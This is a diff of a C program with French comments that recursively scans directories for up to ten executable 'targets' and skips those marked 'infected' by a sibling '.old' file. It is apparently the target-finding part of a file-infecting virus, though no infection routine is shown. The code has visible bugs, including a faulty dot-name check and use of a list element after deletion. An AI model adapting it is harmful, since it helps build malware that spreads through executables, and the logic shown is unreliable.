@@ -7,6 +7,8 @@
 #include <string.h>
 #include <stdbool.h>
 
+#define NB_CIBLES 10
+
 typedef struct Element Element;
 struct Element
 {
@@ -20,7 +22,6 @@ struct List
     Element *p;
 };
 
-//TODO rendre unifome le check ou en faire deux distinct entre la vérification depuis la liste "old" et "exec"
 bool isInfected(char* file, List *liste)
 {
     if (liste == NULL)
@@ -45,7 +46,7 @@ void printList(List *liste)
 {
     if (liste == NULL)
     {
-        printf("Liste Vide \n");
+        return;
     }
     else
     {
@@ -117,92 +118,66 @@ bool    deleteItem(List *list, Element *deleteItem) {
     return true;
 }
 
-List* rechercherFichier(){
+List* recursiveResearch(char* PATH, int cibles){
     DIR *dirp;
     struct dirent *entry;
     struct stat s;
-    char fichier[400];
-    char PATH[_SC_UCHAR_MAX];
-    
-    if(getcwd(PATH, _SC_UCHAR_MAX) == NULL) {
-        return NULL;
-    }
 
-    //TODO spécifique à "/dir/"?
-    if (!strstr(PATH,"/dir")){
-        sprintf(PATH,"%s/dir/", PATH);
-    }else {
-        sprintf(PATH,"%s/", PATH);
-    }
-
-
-    //TODO -----------------------------
-    //possible de découper ici la fonction pour faire la récursion
-    //comme ca, on founi PATH en argument et cela va forcément chercher sur le dossier actuel
     dirp = opendir(PATH);
-
-    List *exec = NULL;
+    List *fichiers = NULL;
     List *old = NULL;
+    char fichier[500];
 
     while ((entry = readdir(dirp)) != NULL) {
-        sprintf(fichier,"%s%s",PATH,entry->d_name);
+        
+        sprintf(fichier,"%s/%s",PATH,entry->d_name);
+        
+
         if (stat(fichier, &s) != -1) {
-            /*
-            if (S_ISDIR(s.st_mode)) { //-> est un dossier
-                if (nbFichierAffecté pas atteint) -> evite la recursion sous d'autres fichier dès le moment où on a tout ce
-                                                    qu'on veut, on va simplement résoudre la recursion en regardant si il y a des .old
-                    recurcive(fichier, &nbFichierAffecté)
-                    //-> /!\ possible d'avoir des soucis avec le check du nombre d'executable infecté, si on devait trouver un .old par la suite si nous
-                    // n'avions pas bifurqué vers un nouveau dossier
-                    //TODO --> possible dans ce cas de stocker les dossier trouvé et de les traiter par la suite si notre nombre d'executable est pas atteint
+            if (S_ISDIR(s.st_mode) && !strstr(entry->d_name,".") && !strstr(entry->d_name,"..") && cibles < NB_CIBLES ) {
+                recursiveResearch(fichier, cibles);
             }
-
-            */
             if ((s.st_mode & S_IXUSR) && (s.st_mode & S_IFREG)){
-                if (!strstr(entry->d_name,".old")) //->Passe avec "MonPg1.old.qqch" ou ".olderFile" (. étant le fichier caché)
+                if (!strstr(entry->d_name,".old") && cibles < NB_CIBLES) //->Passe avec "MonPg1.old.qqch" ou ".olderFile" (. étant le fichier caché)
                 {
-                    //TODO possible de check si le fichier est affecté ici directement
-                    //Is affected est le test d'existance entre deux listes
-
-                    //isInfected(fichier, old) == true
-                        // -> on le retire de "old" -> nous ne sommes plus sensé le retrouver
-                        // -> et on le rajoute PAS dans "exec"
-                    exec = insert(exec, fichier);
-                }
+                    //printf("Fichier : %s\n", fichier);
+                    fichiers = insert(fichiers, fichier);
+                    cibles++;
+                } 
                 else
                 {
-                    //TODO possible de check si le fichier est affecté ici directement
-                    //Is affected est le test d'existance entre deux listes
-                    //si le fichier executable est retrouvé alors qu'on trouve son .old -> on le retire de "exec"
-                    //sinon on le rajoute dans la liste "old"
-
-                    //isInfected(fichier, exec) == true
-                        // -> on le retire de "exec" -> nous ne sommes plus sensé le retrouver
-                        // -> et on le rajoute PAS dans "old"
                     old = insert(old, fichier);
                 }
             }
         }
     }
-    //-------------------------------
-    
-    Element *actuel = exec->p;
-    Element *del = NULL;
-    while (actuel) {
-        if (actuel && isInfected(actuel->fichier, old) == true) {
-            del = actuel; //-> attention a pas se faire avoir par le décalage quand on delete sur une liste exploré
-            actuel = actuel->prev;
-            deleteItem(exec, del);
-        } else {
+
+    if (fichiers)
+    {
+        Element *actuel = fichiers->p;
+        while (actuel != NULL)
+        {
+            //printf("%s\n", actuel->fichier);
+            if (isInfected(actuel->fichier, old)){
+                deleteItem(fichiers, actuel);
+            }
             actuel = actuel->prev;
         }
     }
 
-    return exec;
+    printList(fichiers);
+    return fichiers;
 }
 
 int main(){
-    List* test = rechercherFichier();
-    printList(test);
+    char PATH[_SC_UCHAR_MAX];
+    
+    if(getcwd(PATH, _SC_UCHAR_MAX) == NULL) {
+        return EXIT_FAILURE;
+    }
+
+    List* cibles = recursiveResearch(PATH, 0);
+
+    //printList(cibles);
     return EXIT_SUCCESS;
 }
